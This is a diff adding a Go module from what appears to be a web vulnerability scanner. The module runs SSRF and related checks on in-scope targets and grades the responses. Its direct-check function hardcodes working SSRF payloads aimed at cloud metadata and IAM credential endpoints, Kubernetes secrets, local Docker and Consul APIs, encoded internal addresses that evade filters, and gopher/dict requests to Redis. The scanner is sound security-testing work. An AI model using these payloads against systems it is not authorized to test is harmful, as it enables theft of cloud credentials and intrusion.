@@ -1,0 +1,648 @@
+package modules
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"net/url"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+
+	"github.com/akha-security/akca/engine/internal/httpclient"
+	"github.com/akha-security/akca/engine/internal/payloadgen"
+	"github.com/akha-security/akca/engine/internal/verification"
+)
+
+func (r *Runner) RunGroupB(ctx context.Context, targets []ScanTarget) ([]ModuleFinding, error) {
+	_ = r.emit("vuln_modules_b_started", "SSRF, LFI & XXE scanning started", map[string]interface{}{
+		"scan_id": r.scanID, "targets": len(targets),
+	})
+
+	workers := r.cfg.PerHostConcurrency
+	if workers <= 0 {
+		workers = 8
+	}
+	if workers > len(targets) {
+		workers = len(targets)
+	}
+
+	var mu sync.Mutex
+	var findings []ModuleFinding
+	var testedCount atomic.Int64
+	var skippedBudgetCount atomic.Int64
+
+	targetCh := make(chan ScanTarget, moduleQueueCapacity(workers, len(targets)))
+
+	var wg sync.WaitGroup
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer func() {
+				if rec := recover(); rec != nil {
+					_ = r.emit("log", fmt.Sprintf("RunGroupB worker recovered from panic: %v", rec), map[string]interface{}{"scan_id": r.scanID})
+				}
+			}()
+			for target := range targetCh {
+				if ctx.Err() != nil {
+					return
+				}
+				if !r.canModuleProbe("ssrf") {
+					skippedBudgetCount.Add(1)
+					continue
+				}
+				if !r.scope.IsInScope(target.EndpointURL) {
+					continue
+				}
+				testedCount.Add(1)
+				func() {
+					defer func() {
+						if rec := recover(); rec != nil {
+							_ = r.emit("log", fmt.Sprintf("RunGroupB target %s recovered from panic: %v", target.EndpointURL, rec), map[string]interface{}{"scan_id": r.scanID})
+						}
+					}()
+					var localFindings []ModuleFinding
+					if r.cfg.AllowsModule("ssrf") {
+						localFindings = append(localFindings, r.runSSRF(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("xxe") {
+						localFindings = append(localFindings, r.runXXE(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("lfi") {
+						localFindings = append(localFindings, r.runLFI(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("file_upload") {
+						localFindings = append(localFindings, r.runFileUpload(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("idor") {
+						localFindings = append(localFindings, r.runIDOR(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("bfla") {
+						localFindings = append(localFindings, r.runBFLA(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("open_redirect") {
+						localFindings = append(localFindings, r.runOpenRedirect(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("host_header") {
+						localFindings = append(localFindings, r.runHostHeader(ctx, target)...)
+					}
+					if r.cfg.AllowsModule("second_order") {
+						localFindings = append(localFindings, r.runSecondOrder(ctx, target)...)
+					}
+
+					if len(localFindings) > 0 {
+						mu.Lock()
+						findings = append(findings, localFindings...)
+						mu.Unlock()
+					}
+				}()
+			}
+		}()
+	}
+	feedModuleTargets(ctx, targetCh, targets)
+	wg.Wait()
+
+	r.releaseUnusedCategoryBudget("serverside")
+	totalTargets := len(targets)
+	tested := int(testedCount.Load())
+	skipped := int(skippedBudgetCount.Load())
+	coveragePct := 100.0
+	if totalTargets > 0 {
+		coveragePct = float64(tested) / float64(totalTargets) * 100.0
+	}
+	_ = r.emit("vuln_modules_b_finished", "SSRF, LFI & XXE scanning finished", map[string]interface{}{
+		"scan_id": r.scanID, "findings": len(findings),
+		"targets_tested": tested, "targets_total": totalTargets,
+		"coverage_percentage": fmt.Sprintf("%.1f%%", coveragePct),
+	})
+	if skipped > 0 {
+		r.emitOnce("group_budget_starved:group_b", "coverage_gap",
+			fmt.Sprintf("Server-side scan group was budget-starved: tested %d of %d targets (%.1f%% coverage)", tested, totalTargets, coveragePct),
+			map[string]interface{}{
+				"scan_id": r.scanID, "group": "group_b",
+				"targets_tested": tested, "targets_total": totalTargets,
+				"coverage_pct": coveragePct,
+			},
+		)
+	}
+	return findings, nil
+}
+
+func (r *Runner) RunGroupBFromDB(ctx context.Context, limit int) ([]ModuleFinding, error) {
+	targets, err := r.LoadTargetsWithEndpointsFromDB(limit)
+	if err != nil {
+		return nil, err
+	}
+	return r.RunGroupB(ctx, targets)
+}
+
+func (r *Runner) runSSRF(ctx context.Context, target ScanTarget) []ModuleFinding {
+	if ok, reason := r.shouldRunModule("ssrf", target); !ok {
+		r.emitSkip("ssrf", target, reason)
+		return nil
+	}
+	strongCandidate, _ := ssrfReady(target)
+	var oastProbes []payloadgen.Payload
+	if r.cfg.EnableOAST {
+		if r.oast != nil {
+			oastProbes = r.buildSSRFOASTProbes(ctx, target)
+			if len(oastProbes) == 0 {
+				r.emitOnce("ssrf_oast_url_unavailable", "coverage_gap", "SSRF OAST URL generation failed", map[string]interface{}{
+					"module": "ssrf", "endpoint": target.EndpointURL, "parameter": target.Parameter,
+				})
+			}
+		} else {
+			r.emitOnce("ssrf_oast_listener_unavailable", "coverage_gap", "SSRF blind OAST coverage unavailable because listener is not running", map[string]interface{}{
+				"module": "ssrf", "endpoint": target.EndpointURL, "parameter": target.Parameter,
+			})
+		}
+	}
+	_ = r.emit("ssrf_probe_started", "SSRF probe coverage started", map[string]interface{}{
+		"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
+		"mode":         map[bool]string{true: "direct_and_oast", false: "oast_only"}[strongCandidate],
+		"oast_enabled": r.cfg.EnableOAST, "oast_registered": len(oastProbes) > 0,
+	})
+	oastSent := r.sendSSRFOASTProbes(ctx, target, oastProbes)
+	if !strongCandidate {
+		// Always attempt OAST probes for weak candidates when available.
+		if oastSent > 0 {
+			_ = r.emit("ssrf_oast_probe_coverage", "SSRF OAST probe coverage recorded", map[string]interface{}{
+				"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
+				"probes_sent": oastSent, "candidate_strength": "weak",
+			})
+		}
+		// Also try a lightweight direct response-based check against cloud
+		// metadata endpoints. This ensures weak candidates are not entirely
+		// dependent on OAST for detection.
+		if directFindings := r.ssrfDirectResponseCheck(ctx, target); len(directFindings) > 0 {
+			return directFindings
+		}
+		if len(oastProbes) == 0 {
+			r.emitSkip("ssrf", target, "weak SSRF candidate: OAST unavailable and direct metadata check negative")
+		}
+		return nil
+	}
+	baseline, ok, baselineReason := r.stableNativeBaselineForModule(ctx, "ssrf", target)
+	if !ok {
+		r.emitSkip("ssrf", target, baselineReason)
+		return nil
+	}
+	type directObservation struct {
+		payload payloadgen.Payload
+		rr      httpclient.RequestResponse
+	}
+	observations := map[string][]directObservation{}
+	var out []ModuleFinding
+	for _, p := range r.modulePayloads(target, "ssrf", "") {
+		if p.ExpectedSignal == "blind_oast" {
+			continue
+		}
+		rr, err := r.probeSSRF(ctx, target, p)
+		if err != nil {
+			continue
+		}
+		if runtimeFinding, handled := r.runtimeSinkProof(ctx, "ssrf", target, p, baseline, rr); handled {
+			if runtimeFinding != nil {
+				r.recordFinding(ctx, &out, runtimeFinding, "ssrf", runtimeFinding.Evidence.Signal)
+				return out
+			}
+			continue
+		}
+		signal := normalizedSSRFSignal(p)
+		if !ssrfSignalConfirmed(p, baseline.Response, rr.Response, signal) {
+			continue
+		}
+		observations[signal] = append(observations[signal], directObservation{payload: p, rr: rr})
+	}
+
+	for signal, proofs := range observations {
+		if len(proofs) >= 2 {
+			// Standard two-probe confirmation
+			first := proofs[0]
+			f := r.verifyAndBuild(ctx, "ssrf", target, first.payload, baseline, first.rr, signal, false, false, "", "")
+			if f != nil {
+				f.Description += " Confirmed by two independent provider-specific direct-response probes."
+				f.Evidence.Verification.UpgradeReasons = append(f.Evidence.Verification.UpgradeReasons,
+					"two_provider_specific_probes")
+			}
+			if r.recordFinding(ctx, &out, f, "ssrf", signal) {
+				return out
+			}
+		} else if len(proofs) == 1 && ssrfHighConfidenceMetadata(
+			proofs[0].payload, baseline.Response, proofs[0].rr.Response, signal,
+		) {
+			// Single probe with very high-confidence cloud metadata fingerprint.
+			// Accept as HighConfidence (not Confirmed) since only one probe matched.
+			first := proofs[0]
+			f := r.verifyAndBuild(ctx, "ssrf", target, first.payload, baseline, first.rr, signal, false, false, "", "")
+			if f != nil {
+				f.Description += " Cloud metadata fingerprint detected in single-probe response body."
+				if f.Evidence.Verification.Confidence == verification.Confirmed {
+					f.Evidence.Verification.Confidence = verification.HighConfidence
+					if f.Evidence.Verification.Score >= 0.9 {
+						f.Evidence.Verification.Score = 0.85
+					}
+				}
+			}
+			if r.recordFinding(ctx, &out, f, "ssrf", signal) {
+				return out
+			}
+		} else if len(proofs) == 1 {
+			// Single probe without high-confidence metadata: re-probe to verify
+			// the signal is reproducible before accepting.
+			first := proofs[0]
+			reprobe, repErr := r.probeSSRF(ctx, target, first.payload)
+			if repErr == nil && ssrfSignalConfirmed(first.payload, baseline.Response, reprobe.Response, signal) {
+				f := r.verifyAndBuild(ctx, "ssrf", target, first.payload, baseline, reprobe, signal, false, false, "", "")
+				if f != nil {
+					f.Description += " Verified by single-probe re-confirmation."
+					if f.Evidence.Verification.Confidence == verification.Confirmed {
+						f.Evidence.Verification.Confidence = verification.HighConfidence
+						if f.Evidence.Verification.Score >= 0.9 {
+							f.Evidence.Verification.Score = 0.80
+						}
+					}
+				}
+				if r.recordFinding(ctx, &out, f, "ssrf", signal) {
+					return out
+				}
+			}
+		}
+	}
+	if len(oastProbes) > 0 {
+		_ = r.emit("ssrf_oast_probe_coverage", "SSRF OAST probe coverage recorded", map[string]interface{}{
+			"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
+			"probes_sent": oastSent, "candidate_strength": "strong",
+		})
+	}
+	return out
+}
+
+func (r *Runner) buildSSRFOASTProbes(ctx context.Context, target ScanTarget) []payloadgen.Payload {
+	const templateURL = "https://akca-oast-template.invalid/"
+	templates := r.generatedModulePayloads(target, "ssrf", templateURL)
+	probes := make([]payloadgen.Payload, 0, len(templates))
+	probeIndex := 0
+	for _, template := range templates {
+		if template.ExpectedSignal != "blind_oast" {
+			continue
+		}
+		probeIndex++
+		callbackURL := strings.TrimSpace(r.oastURL(ctx,
+			fmt.Sprintf("ssrf-%s-%d", target.Parameter, probeIndex), target, "ssrf"))
+		if callbackURL == "" {
+			continue
+		}
+		for _, candidate := range r.generatedModulePayloads(target, "ssrf", callbackURL) {
+			if sameOASTPayloadVariant(template, candidate) {
+				probes = append(probes, candidate)
+				break
+			}
+		}
+	}
+	return probes
+}
+
+func sameOASTPayloadVariant(left, right payloadgen.Payload) bool {
+	return left.ExpectedSignal == "blind_oast" && right.ExpectedSignal == "blind_oast" &&
+		left.Variant == right.Variant && left.Encoding == right.Encoding &&
+		left.WAFAdapted == right.WAFAdapted && left.WAFVendor == right.WAFVendor &&
+		left.Technique == right.Technique && left.TransportEncoding == right.TransportEncoding
+}
+
+func (r *Runner) sendSSRFOASTProbes(ctx context.Context, target ScanTarget, probes []payloadgen.Payload) int {
+	sent := 0
+	for _, p := range probes {
+		if r.sendOASTProbe(ctx, target, strings.TrimSpace(p.Value)) {
+			sent++
+		}
+	}
+	return sent
+}
+
+func ssrfSignal(body, baseline, signal string) bool {
+	p := payloadgen.Payload{ExpectedSignal: signal}
+	return ssrfSignalConfirmed(p,
+		httpclient.ResponseRecord{Body: baseline},
+		httpclient.ResponseRecord{Body: body},
+		signal,
+	)
+}
+
+func normalizedSSRFSignal(p payloadgen.Payload) string {
+	if signal := canonicalSSRFSignal(p, p.ExpectedSignal); signal != "" {
+		return signal
+	}
+	value := strings.ToLower(p.Value)
+	switch {
+	case strings.Contains(value, "metadata.google"):
+		return "gcp_metadata"
+	case strings.Contains(value, "metadata/instance") || strings.Contains(value, "identity/oauth2"):
+		return "azure_metadata"
+	case strings.Contains(value, "100.100.100.200"):
+		return "alibaba_metadata"
+	case strings.Contains(value, "metadata/v1.json") || strings.Contains(value, "metadata/v1/"):
+		return "do_metadata"
+	case strings.Contains(value, "192.0.0.192"):
+		return "oracle_metadata"
+	case strings.Contains(value, "kubernetes") || strings.Contains(value, "serviceaccount"):
+		return "k8s_metadata"
+	default:
+		return "aws_metadata"
+	}
+}
+
+// ssrfHighConfidenceMetadata returns true when the response body contains
+// cloud provider metadata fingerprints that cannot occur by accident. These
+// patterns are specific enough that a single matching probe is sufficient
+// to report at HighConfidence level.
+func ssrfHighConfidenceMetadata(p payloadgen.Payload, baseline, probe httpclient.ResponseRecord, signal string) bool {
+	if !ssrfSignalConfirmed(p, baseline, probe, signal) {
+		return false
+	}
+	body := strings.ToLower(probe.Body)
+	base := strings.ToLower(baseline.Body)
+	switch canonicalSSRFSignal(p, signal) {
+	case "aws_metadata":
+		return newMarkerCount(body, base, []string{
+			"ami-id", "instance-id", "instance-type", "local-hostname", "accesskeyid", "secretaccesskey",
+		}) >= 2
+	case "gcp_metadata":
+		if strings.EqualFold(headerCI(probe.Headers, "Metadata-Flavor"), "Google") {
+			return newMarkerCount(body, base, []string{"project/project-id", "instance/id", "service-accounts/", "hostname"}) >= 1
+		}
+		return newMarkerCount(body, base, []string{"project/project-id", "instance/id", "service-accounts/", "email", "scopes"}) >= 2
+	case "azure_metadata":
+		return newMarkerCount(body, base, []string{"vmid", "subscriptionid", "resourcegroupname", "microsoft.compute", "azureenvironment"}) >= 2
+	case "alibaba_metadata":
+		return newMarkerCount(body, base, []string{"owner-account-id", "region-id", "zone-id", "image-id", "instance/instance-type"}) >= 2
+	case "do_metadata":
+		return newMarkerCount(body, base, []string{"droplet_id", "vendor_data", "public_keys", "region", "hostname"}) >= 2
+	case "oracle_metadata":
+		return newMarkerCount(body, base, []string{"compartmentid", "canonicalregionname", "ocid1.", "oraclecloud.com", "shape"}) >= 2
+	case "tencent_metadata":
+		return newMarkerCount(body, base, []string{"app-id", "placement/region", "instance/instance-name", "instance/instance-id"}) >= 2
+	case "packet_metadata":
+		return newMarkerCount(body, base, []string{"bonding_mode", "facility", "operating_system", "iqn"}) >= 2
+	default:
+		return false
+	}
+}
+
+func (r *Runner) probeSSRF(ctx context.Context, target ScanTarget, p payloadgen.Payload) (httpclient.RequestResponse, error) {
+	headers := map[string]string{}
+	switch normalizedSSRFSignal(p) {
+	case "gcp_metadata", "gcp_token":
+		headers["Metadata-Flavor"] = "Google"
+	case "azure_metadata", "azure_token":
+		headers["Metadata"] = "true"
+	}
+	if p.Variant == "aws_imds_v2_token" {
+		headers["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"
+	}
+	if len(headers) > 0 {
+		return r.probeWithHeadersForModule(ctx, "ssrf", target, strings.TrimSpace(p.Value), headers)
+	}
+	return r.probeForModule(ctx, "ssrf", target, strings.TrimSpace(p.Value))
+}
+
+// ssrfDirectResponseCheck performs a lightweight direct response-based SSRF
+// check for weak candidates. It sends cloud metadata payloads and checks
+// for known metadata fingerprints in the response body, without requiring
+// OAST callbacks.
+func (r *Runner) ssrfDirectResponseCheck(ctx context.Context, target ScanTarget) []ModuleFinding {
+	baseline, ok, reason := r.stableNativeBaselineForModule(ctx, "ssrf", target)
+	if !ok {
+		r.emitSkip("ssrf", target, "weak candidate direct check: "+reason)
+		return nil
+	}
+	metadataPayloads := []payloadgen.Payload{
+		{VulnClass: "ssrf", Value: "http://169.254.169.254/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "aws_imds_v1"},
+		{VulnClass: "ssrf", Value: "http://169.254.169.254/latest/api/token", ExpectedSignal: "aws_metadata", Variant: "aws_imds_v2_token"},
+		{VulnClass: "ssrf", Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ExpectedSignal: "aws_iam_role", Variant: "aws_iam_security_credentials"},
+		{VulnClass: "ssrf", Value: "http://metadata.google.internal/computeMetadata/v1/", ExpectedSignal: "gcp_metadata", Variant: "gcp_metadata"},
+		{VulnClass: "ssrf", Value: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ExpectedSignal: "gcp_token", Variant: "gcp_service_account_token"},
+		{VulnClass: "ssrf", Value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ExpectedSignal: "azure_metadata", Variant: "azure_imds"},
+		{VulnClass: "ssrf", Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", ExpectedSignal: "azure_token", Variant: "azure_identity_token"},
+		{VulnClass: "ssrf", Value: "http://127.0.0.1:2375/version", ExpectedSignal: "docker_api", Variant: "docker_daemon"},
+		{VulnClass: "ssrf", Value: "http://127.0.0.1:8500/v1/agent/self", ExpectedSignal: "consul_api", Variant: "consul_service"},
+		{VulnClass: "ssrf", Value: "http://127.0.0.1/", ExpectedSignal: "internal_ip", Variant: "loopback_ip"},
+		{VulnClass: "ssrf", Value: "http://localhost/", ExpectedSignal: "internal_ip", Variant: "loopback_localhost"},
+		// IP representation bypass variants (127.0.0.1 and 169.254.169.254)
+		{VulnClass: "ssrf", Value: "http://2130706433/", ExpectedSignal: "internal_ip", Variant: "decimal_127_0_0_1"},
+		{VulnClass: "ssrf", Value: "http://2852039166/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "decimal_imds_ip"},
+		{VulnClass: "ssrf", Value: "http://0x7f000001/", ExpectedSignal: "internal_ip", Variant: "hex_ip"},
+		{VulnClass: "ssrf", Value: "http://0xa9fea9fe/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "hex_imds_ip"},
+		{VulnClass: "ssrf", Value: "http://0177.0.0.1/", ExpectedSignal: "internal_ip", Variant: "octal_ip"},
+		{VulnClass: "ssrf", Value: "http://0251.0372.0251.0372/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "octal_imds_ip"},
+		{VulnClass: "ssrf", Value: "http://[::1]/", ExpectedSignal: "internal_ip", Variant: "ipv6_loopback"},
+		{VulnClass: "ssrf", Value: "http://127.1/", ExpectedSignal: "internal_ip", Variant: "short_loopback"},
+		{VulnClass: "ssrf", Value: "http://[0:0:0:0:0:ffff:127.0.0.1]/", ExpectedSignal: "internal_ip", Variant: "ipv6_mapped_v4"},
+		{VulnClass: "ssrf", Value: "http://127.0.0.1.nip.io/", ExpectedSignal: "internal_ip", Variant: "dns_rebind_nip_io"},
+		{VulnClass: "ssrf", Value: "http://169.254.169.254.nip.io/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "dns_rebind_imds_nip_io"},
+		// Additional cloud providers & orchestrators
+		{VulnClass: "ssrf", Value: "http://100.100.100.200/latest/meta-data/", ExpectedSignal: "alibaba_metadata", Variant: "alibaba_metadata"},
+		{VulnClass: "ssrf", Value: "http://169.254.169.254/metadata/v1.json", ExpectedSignal: "do_metadata", Variant: "digitalocean_metadata"},
+		{VulnClass: "ssrf", Value: "http://192.0.0.192/latest/meta-data/", ExpectedSignal: "oracle_metadata", Variant: "oracle_cloud_metadata"},
+		{VulnClass: "ssrf", Value: "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", ExpectedSignal: "k8s_secrets", Variant: "k8s_internal_api"},
+		{VulnClass: "ssrf", Value: "file:///var/run/secrets/kubernetes.io/serviceaccount/token", ExpectedSignal: "k8s_secrets", Variant: "k8s_service_account_token"},
+		// Protocol smuggling variants
+		{VulnClass: "ssrf", Value: "gopher://127.0.0.1:6379/_PING%0d%0a", ExpectedSignal: "protocol_smuggling", Variant: "gopher_redis"},
+		{VulnClass: "ssrf", Value: "gopher://127.0.0.1:6379/_INFO%0d%0a", ExpectedSignal: "redis_service", Variant: "gopher_redis_info"},
+		{VulnClass: "ssrf", Value: "dict://127.0.0.1:11211/stat", ExpectedSignal: "protocol_smuggling", Variant: "dict_memcached"},
+		{VulnClass: "ssrf", Value: "dict://127.0.0.1:6379/info", ExpectedSignal: "redis_service", Variant: "dict_redis"},
+		{VulnClass: "ssrf", Value: "ldap://127.0.0.1:389/o=base", ExpectedSignal: "protocol_smuggling", Variant: "ldap_smuggling"},
+
+		// Additional variations
+		{VulnClass: "ssrf", Value: "http://[::ffff:169.254.169.254]/latest/meta-data/", ExpectedSignal: "aws_metadata", Variant: "ipv6_mapped_aws"},
+		{VulnClass: "ssrf", Value: "http://017700000001/", ExpectedSignal: "internal_ip", Variant: "octal_notation_long"},
+		{VulnClass: "ssrf", Value: "http://0/", ExpectedSignal: "internal_ip", Variant: "zero_ip"},
+	}
+	var out []ModuleFinding
+	for _, p := range metadataPayloads {
+		if ctx.Err() != nil {
+			break
+		}
+		rr, err := r.probeSSRF(ctx, target, p)
+		if err != nil {
+			continue
+		}
+		if ssrfHighConfidenceMetadata(p, baseline.Response, rr.Response, p.ExpectedSignal) {
+			signal := normalizedSSRFSignal(p)
+			f := r.verifyAndBuild(ctx, "ssrf", target, p, baseline, rr, signal, false, false, "", "")
+			if f != nil {
+				lowerBody := strings.ToLower(rr.Response.Body)
+				if strings.Contains(lowerBody, "accesskeyid") || strings.Contains(lowerBody, "secretaccesskey") ||
+					strings.Contains(lowerBody, "access_token") || strings.Contains(lowerBody, "security-credentials") {
+					f.Title = "Critical SSRF — Cloud IAM / Token Exposure (" + p.Variant + ")"
+					f.Severity = "critical"
+					f.Description = "Server-Side Request Forgery successfully retrieved cloud instance credentials / IAM tokens from internal metadata."
+				} else {
+					f.Description += " Direct response SSRF signal detected on target."
+				}
+				if f.Evidence.Verification.Confidence == verification.Confirmed {
+					f.Evidence.Verification.Confidence = verification.HighConfidence
+					if f.Evidence.Verification.Score >= 0.9 {
+						f.Evidence.Verification.Score = 0.85
+					}
+				}
+			}
+			if r.recordFinding(ctx, &out, f, "ssrf", signal) {
+				return out
+			}
+		}
+	}
+	return out
+}
+
+func (r *Runner) stableNativeBaseline(ctx context.Context, target ScanTarget) (httpclient.RequestResponse, bool, string) {
+	return r.stableNativeBaselineForModule(ctx, "", target)
+}
+
+// stableNativeBaselineForModule sends the same request 3 times and verifies that
+// the responses are nearly identical (same status code, body diff ratio < 0.35).
+// When the baseline is unstable the third return value describes why, so the
+// caller can emit a diagnostic skip event instead of silently dropping the target.
+func (r *Runner) stableNativeBaselineForModule(ctx context.Context, module string, target ScanTarget) (httpclient.RequestResponse, bool, string) {
+	value := nativeTargetValue(target)
+	var samples []httpclient.RequestResponse
+	for i := 0; i < 3; i++ {
+		rr, err := r.probeForModule(ctx, module, target, value)
+		if err != nil {
+			continue
+		}
+		samples = append(samples, rr)
+	}
+	if len(samples) < 2 {
+		fallback, err := r.cachedEmptyProbe(ctx, target)
+		if err == nil {
+			samples = append(samples, fallback)
+		}
+	}
+	if len(samples) < 2 {
+		return httpclient.RequestResponse{}, false, "baseline probe produced fewer than two usable responses"
+	}
+	statusCounts := map[int]int{}
+	modalStatus, modalCount := 0, 0
+	for _, sample := range samples {
+		statusCounts[sample.Response.StatusCode]++
+		if statusCounts[sample.Response.StatusCode] > modalCount {
+			modalStatus, modalCount = sample.Response.StatusCode, statusCounts[sample.Response.StatusCode]
+		}
+	}
+	if modalCount < 2 {
+		return httpclient.RequestResponse{}, false, "unstable baseline: no status code was reproduced"
+	}
+	var modal []httpclient.RequestResponse
+	for _, sample := range samples {
+		if sample.Response.StatusCode == modalStatus {
+			modal = append(modal, sample)
+		}
+	}
+	bestRatio := 2.0
+	best := modal[0]
+	for i := 0; i < len(modal); i++ {
+		for j := i + 1; j < len(modal); j++ {
+			ratio := bodyDiffRatio(normalizeVolatileFields(modal[i].Response.Body), normalizeVolatileFields(modal[j].Response.Body))
+			if ratio < bestRatio {
+				bestRatio = ratio
+				best = modal[i]
+			}
+		}
+	}
+	if bestRatio > 0.85 {
+		return httpclient.RequestResponse{}, false, fmt.Sprintf("unstable baseline: best reproduced body diff ratio %.4f exceeds threshold 0.85", bestRatio)
+	}
+	return best, true, ""
+}
+
+func nativeTargetValue(target ScanTarget) string {
+	u, err := url.Parse(target.EndpointURL)
+	if err == nil && target.Parameter != "" {
+		if value, exists := u.Query()[target.Parameter]; exists && len(value) > 0 {
+			return value[0]
+		}
+	}
+	body := target.BodyTemplate
+	if body == "" {
+		body = target.RequestTemplate.Body
+	}
+	if body != "" && target.Parameter != "" {
+		location := strings.ToLower(strings.TrimSpace(target.Location))
+		if location == "form" {
+			if values, err := url.ParseQuery(body); err == nil {
+				return values.Get(target.Parameter)
+			}
+		}
+		if location == "json" || strings.Contains(strings.ToLower(target.Profile.ContentType), "json") || strings.HasPrefix(strings.TrimSpace(body), "{") || strings.HasPrefix(strings.TrimSpace(body), "[") {
+			var doc any
+			if json.Unmarshal([]byte(body), &doc) == nil {
+				normParam := strings.ReplaceAll(target.Parameter, "[", ".")
+				normParam = strings.ReplaceAll(normParam, "]", "")
+				normParam = strings.Trim(normParam, ".")
+				parts := strings.Split(normParam, ".")
+				if val, found := getJSONValueByPath(doc, parts); found {
+					return fmt.Sprint(val)
+				}
+			}
+		}
+	}
+	if strings.EqualFold(target.Location, "path") && target.Parameter != "" {
+		if u, err := url.Parse(target.EndpointURL); err == nil {
+			segs := strings.Split(strings.Trim(u.Path, "/"), "/")
+			for _, seg := range segs {
+				if seg != "" && seg != target.Parameter {
+					return seg
+				}
+			}
+		}
+	}
+	return ""
+}
+
+func getJSONValueByPath(current any, path []string) (any, bool) {
+	if len(path) == 0 || current == nil {
+		return nil, false
+	}
+	switch node := current.(type) {
+	case map[string]any:
+		val, exists := node[path[0]]
+		if !exists {
+			return nil, false
+		}
+		if len(path) == 1 {
+			return val, true
+		}
+		return getJSONValueByPath(val, path[1:])
+	case []any:
+		idx, err := strconv.Atoi(path[0])
+		if err == nil && idx >= 0 && idx < len(node) {
+			if len(path) == 1 {
+				return node[idx], true
+			}
+			return getJSONValueByPath(node[idx], path[1:])
+		}
+		for _, item := range node {
+			if val, ok := getJSONValueByPath(item, path); ok {
+				return val, true
+			}
+		}
+	}
+	return nil, false
+}
+
+func isNumericTargetValue(target ScanTarget) bool {
+	val := strings.TrimSpace(nativeTargetValue(target))
+	if val == "" {
+		return false
+	}
+	if _, err := strconv.ParseInt(val, 10, 64); err == nil {
+		return true
+	}
+	if _, err := strconv.ParseFloat(val, 64); err == nil {
+		return true
+	}
+	return false
+}
